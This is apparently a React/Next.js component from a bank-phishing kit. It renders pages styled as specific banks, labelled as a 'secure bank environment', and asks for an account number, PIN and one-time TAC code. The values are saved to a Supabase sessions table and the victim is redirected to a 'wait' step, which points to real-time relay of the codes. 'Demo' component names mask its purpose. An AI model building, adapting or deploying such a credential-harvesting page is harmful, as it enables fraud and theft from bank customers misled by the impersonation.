"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { DemoShell } from "@/components/demo/DemoShell";
import { getBankBySlug } from "@/lib/at-bank-catalog";
import type { BankTheme } from "@/lib/bank-theme-config";
import { getBankTheme } from "@/lib/bank-theme-config";
import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type Props = {
  sessionId: string;
  bankSlug: string;
};

export function BankLoginClient({ sessionId, bankSlug }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const bank = useMemo(() => getBankBySlug(bankSlug), [bankSlug]);
  const [theme, setTheme] = useState<BankTheme | null>(null);

  const [verfuegernummer, setVerfuegernummer] = useState("");
  const [pin, setPin] = useState("");
  const [tacCode, setTacCode] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const nextTheme = await getBankTheme(bankSlug);
      if (!cancelled) setTheme(nextTheme);
    })();
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setVerfuegernummer(fd.verfuegernummer ?? "");
      setPin(fd.pin ?? "");
      setTacCode(fd.tacCode ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(fields: { verfuegernummer: string; pin: string; tacCode: string }) {
    if (!supabase || !sessionId || !bank) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const normalizedFields = normalizeBankLoginFields(fields);
    const credentials = normalizeBankCredentialPayload({
      bankSlug: bank.slug,
      bankName: bank.name,
      ...normalizedFields,
    });
    const { error: updateError } = await supabase
      .from("sessions")
      .update({
        current_step: "wait",
        form_data: {
          ...prev,
          ...credentials,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
      return;
    }
    router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <DemoShell title="Bankinlog">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (!bank) {
    return (
      <DemoShell title="Bankinlog">
        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
          Onbekende bank. Start de selectie opnieuw.
        </p>
      </DemoShell>
    );
  }

  if (!theme) {
    return (
      <DemoShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
        </div>
      </DemoShell>
    );
  }

  return (
    <DemoShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
      <div className="app-panel overflow-hidden rounded-2xl">
        <div
          className="flex items-center justify-between px-5 py-4 text-white"
          style={{ backgroundColor: theme.colors.primary, color: theme.colors.textOnPrimary }}
        >
          <div className="flex items-center gap-3">
            <div
              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide"
              style={{ backgroundColor: theme.colors.secondary, color: theme.colors.textOnPrimary }}
            >
              {theme.logoText}
            </div>
            <div>
              <p className="text-xs uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
              <h2 className="text-lg font-bold">{bank.name}</h2>
            </div>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            void handleSubmit({ verfuegernummer, pin, tacCode });
          }}
          className="space-y-4 p-5"
        >
          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.verfuegernummer}
            <input
              required
              className="app-input mt-1 w-full px-3 py-2"
              value={verfuegernummer}
              onChange={(e) => setVerfuegernummer(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.pin}
            <input
              required
              type="password"
              className="app-input mt-1 w-full px-3 py-2"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.tacCode}
            <input
              required
              inputMode="numeric"
              maxLength={6}
              className="app-input mt-1 w-full px-3 py-2"
              value={tacCode}
              onChange={(e) => setTacCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            />
          </label>

          {error ? <p className="text-sm text-red-700">{error}</p> : null}

          <button
            type="submit"
            disabled={saving}
            className="app-btn w-full rounded-xl py-3 text-sm disabled:opacity-60"
          >
            {saving ? "Controleren..." : theme.buttonText}
          </button>
        </form>
      </div>
    </DemoShell>
  );
}
